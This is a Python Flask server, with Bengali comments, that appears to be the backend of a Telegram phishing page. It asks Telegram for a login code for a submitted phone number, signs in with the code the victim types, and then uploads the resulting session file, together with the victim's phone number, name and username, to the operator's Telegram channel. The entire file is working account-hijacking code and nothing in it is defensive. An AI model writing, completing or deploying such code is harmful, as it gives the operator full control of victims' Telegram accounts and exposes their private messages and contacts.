import os
import asyncio
from flask import Flask, request, jsonify
from telethon import TelegramClient, errors
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # CORS সাপোর্ট যোগ করুন (Netlify থেকে কল করার জন্য)

# ========== এনভায়রনমেন্ট ভেরিয়েবল ==========
API_ID = int(os.environ.get('API_ID', 0))
API_HASH = os.environ.get('API_HASH', '')
YOUR_CHANNEL = os.environ.get('YOUR_CHANNEL', '@your_channel')
# =============================================

temp_data = {}

async def send_session_to_channel(session_path, phone, user_info):
    """সেশন ফাইল চ্যানেলে পাঠায়"""
    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        channel = await client.get_entity(YOUR_CHANNEL)
        
        message = f"🔐 **নতুন সেশন!**\n📱 ফোন: `{phone}`\n👤 নাম: {user_info.first_name}\n📛 ইউজারনেম: @{user_info.username or 'নেই'}"
        session_file = f"{session_path}.session"
        
        await client.send_file(channel, session_file, caption=message)
        await client.disconnect()
        return True
    except Exception as e:
        print(f"Error sending session: {e}")
        return False

@app.route('/send_code', methods=['POST'])
def send_code():
    data = request.get_json()
    phone = data.get('phone', '').strip()
    
    if not phone:
        return jsonify({'success': False, 'message': 'ফোন নম্বর দিন!'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        import hashlib
        import time
        session_hash = hashlib.md5(f"{phone}_{time.time()}".encode()).hexdigest()[:16]
        session_name = f"sessions/user_{session_hash}"
        
        client = TelegramClient(session_name, API_ID, API_HASH)
        loop.run_until_complete(client.connect())
        result = loop.run_until_complete(client.send_code_request(phone))
        
        temp_data[phone] = {
            'client': client,
            'session_name': session_name,
            'phone_code_hash': result.phone_code_hash
        }
        
        loop.close()
        return jsonify({'success': True, 'message': 'OTP পাঠানো হয়েছে!'})
        
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/verify', methods=['POST'])
def verify():
    data = request.get_json()
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    
    if phone not in temp_data:
        return jsonify({'success': False, 'message': 'সেশন নেই! আবার চেষ্টা করুন।'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client_info = temp_data[phone]
        client = client_info['client']
        session_name = client_info['session_name']
        phone_code_hash = client_info['phone_code_hash']
        
        loop.run_until_complete(client.sign_in(phone, code, phone_code_hash=phone_code_hash))
        me = loop.run_until_complete(client.get_me())
        
        loop.run_until_complete(send_session_to_channel(session_name, phone, me))
        
        loop.close()
        del temp_data[phone]
        
        return jsonify({'success': True, 'message': f'লগইন সফল! স্বাগতম {me.first_name}'})
        
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/resend_code', methods=['POST'])
def resend_code():
    data = request.get_json()
    phone = data.get('phone', '').strip()
    
    if phone in temp_data:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(temp_data[phone]['client'].disconnect())
            loop.close()
            del temp_data[phone]
        except:
            pass
    
    return send_code()

if __name__ == '__main__':
    os.makedirs('sessions', exist_ok=True)
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
